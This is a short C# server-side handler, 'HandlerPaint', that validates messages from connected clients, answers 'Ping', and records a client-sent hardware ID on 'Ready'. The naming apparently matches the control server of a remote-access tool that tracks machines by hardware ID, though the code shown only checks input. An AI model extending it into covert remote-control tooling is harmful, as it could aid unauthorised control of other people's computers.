using Server.Connectings;

namespace Server.Messages;

internal class HandlerPaint
{
	private const int MaxCommandLength = 32;

	private const int MaxHwidLength = 100;

	private const int MaxArrayLength = 8;

	public static void Read(Clients client, object[] objects)
	{
		if (objects == null || objects.Length < 2 || objects.Length > 8)
		{
			client.Disconnect();
			return;
		}
		if (objects[1] == null || !(objects[1] is string))
		{
			client.Disconnect();
			return;
		}
		string command = (string)objects[1];
		if (command == null || command.Length > 32 || command.Length == 0)
		{
			client.Disconnect();
		}
		else if (command == "Ready")
		{
			if (objects.Length < 3)
			{
				return;
			}
			if (objects[2] == null || !(objects[2] is string))
			{
				client.Disconnect();
				return;
			}
			string hwid = (string)objects[2];
			if (hwid.Length > 100)
			{
				client.Disconnect();
			}
			else
			{
				client.Hwid = hwid;
			}
		}
		else if (command != "Ping")
		{
			client.Disconnect();
		}
	}
}
